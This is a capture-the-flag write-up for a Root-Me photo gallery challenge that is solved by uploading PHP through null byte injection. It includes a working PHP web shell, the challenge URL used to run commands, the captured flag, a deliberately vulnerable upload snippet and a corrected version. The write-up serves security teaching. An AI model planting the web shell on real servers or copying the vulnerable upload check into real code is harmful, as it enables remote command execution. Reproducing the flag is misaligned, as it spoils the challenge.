
##### Challenge Description

Your goal is to hack this photo galery by uploading PHP code.

More info about securing file uploads in PHP :

https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Secure%20file%20upload%20in%20PHP%20web%20applications.pdf

###### What is a Null Byte (%00) :

A **null byte**, represented as `%00` in URL encoding or `\x00` in hex, is a control character that signifies the end of a string in many programming languages like C and C++.

In security contexts, it is used to perform an injection attack where a malicious string is terminated early, tricking a system into ignoring the characters that follow it (such as a `.jpg` extension).

When I upload a file I see this in BurpSuite :

![](../../PicoCTF/PicoCTF-assets/Pasted%20image%2020260307224150.png)

![](../../PicoCTF/PicoCTF-assets/Pasted%20image%2020260307224153.png)

The payload will allow me to run the command that I want with ?c=id : 

```
<?php
if(isset($_GET['c'])) {
    echo "<pre>"; 
    system($_GET['c']);
    echo "</pre>";
}
?>
```

Open the image in a new tab

![](../../PicoCTF/PicoCTF-assets/Pasted%20image%2020260307234908.png)

Then open in a new tab and find the password :

Modified URL  (remove the %00.png because it already downloaded):

http://challenge01.root-me.org/web-serveur/ch22/galerie/upload/2ec40fea5de474a2980db35cced66160/images.php?c=id


![](../../PicoCTF/PicoCTF-assets/Pasted%20image%2020260307235605.png)

Flag : YPNchi2NmTwygr2dgCCF

## WRONG CODE : 

This code is vulnerable to a null byte injection because it uses a regex that only validates the end of the filename, allowing an attacker to bypass the extension check and save a malicious script (like `shell.php`) when the underlying operating system terminates the string at the `%00` character.

>[!note]
>
```
// VULNERABLE FILE UPLOAD
$filename = $_FILES['uploaded_file']['name']; // Input: "shell.php%00.jpg"

// The developer checks for the extension
if (preg_match('/\.jpg$/', $filename)) {
    // The check passes because ".jpg" is at the very end!
    
    // BUT: When moving the file, the OS stops at the Null Byte
    // It saves the file as "shell.php" instead of "shell.php\0.jpg"
    move_uploaded_file($_FILES['uploaded_file']['tmp_name'], "uploads/" . $filename);
    
    echo "File uploaded successfully!";
}

```

## SOLUTION CODE :

This secure version mitigates the risk by stripping null bytes, validating the file extension through a robust path analysis, and completely replacing the user-provided filename with a randomly generated one to prevent any local file system manipulation.

>[!Note]
```
// SECURE FILE UPLOAD
$filename = $_FILES['uploaded_file']['name'];

// 1. Remove Null Bytes immediately
$filename = str_replace(chr(0), '', $filename);

// 2. Validate the extension properly using pathinfo
$info = pathinfo($filename);
$extension = strtolower($info['extension']);

$allowed_extensions = ['jpg', 'jpeg', 'png'];

if (in_array($extension, $allowed_extensions)) {
    // 3. BEST PRACTICE: Generate a new, random name
    // This ignores the user's provided filename entirely
    $new_name = bin2hex(random_bytes(10)) . "." . $extension;
    
    move_uploaded_file($_FILES['uploaded_file']['tmp_name'], "uploads/" . $new_name);
    echo "File uploaded as: " . $new_name;
} else {
    echo "Invalid file type!";
}
```
